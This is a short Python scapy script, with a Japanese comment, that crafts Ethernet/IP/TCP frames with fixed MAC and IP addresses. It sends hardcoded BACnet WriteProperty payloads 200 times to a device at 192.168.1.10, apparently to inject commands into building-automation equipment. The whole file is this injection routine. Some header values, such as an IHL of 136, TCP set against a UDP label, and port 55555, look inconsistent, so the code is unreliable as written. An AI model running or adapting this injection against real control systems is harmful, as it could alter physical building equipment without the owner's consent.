#import re
from time import sleep
import binascii
import random, string
from scapy.all import *

M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス

PROTO_NUM = 17 #icmp:1 tcp:6 udp:17
TH1 = 71 #WriteProperty:71

IF = "en8"
#FILTER = "ether src "+ T_MAC1 +" and not ether src "+ M_MAC

ON01 ='810a001c01040004e6100c004000081e09552e4441c800002f39081f'
ON02 ='810a001c01040004ed100c004000081e09552e4441a000002f39081f'
ON03 ='810a001c01040004f4100c004000041e09552e4441c800002f39081f'
ON04 ='810a001c01040004f5100c0040000c1e09552e4441a000002f39081f'

on_01 = binascii.unhexlify(ON02)
on_02 = binascii.unhexlify(ON04)
on_03 = binascii.unhexlify(ON02)
on_04 = binascii.unhexlify(ON04)

eth = Ether()
eth.src = '74:3a:65:84:c7:82'
eth.dst = '00:e0:5d:00:36:ef'
eth.type = 0x0800

ip = IP()
ip.version =4
ip.ihl = 136
ip.id = 19355
ip.flags = 0x0000
ip.frag = 1
ip.ttl = 64
ip.proto = 'tcp'
ip.src = '192.168.2.11'
ip.dst = '192.168.1.10'

tcp = TCP()
tcp.sport = 21
tcp.dport = 55555# bacnet

for i in range(0,200):
    ip.id += 2
    pkt = eth/ip/tcp/on_01
    sendp(pkt,iface=IF)
    ip.id += 2
    pkt = eth/ip/tcp/on_02
    sendp(pkt,iface=IF)
    ip.id += 2
    pkt = eth/ip/tcp/on_03
    sendp(pkt,iface=IF)
    ip.id += 2
    pkt = eth/ip/tcp/on_04
    sendp(pkt,iface=IF)

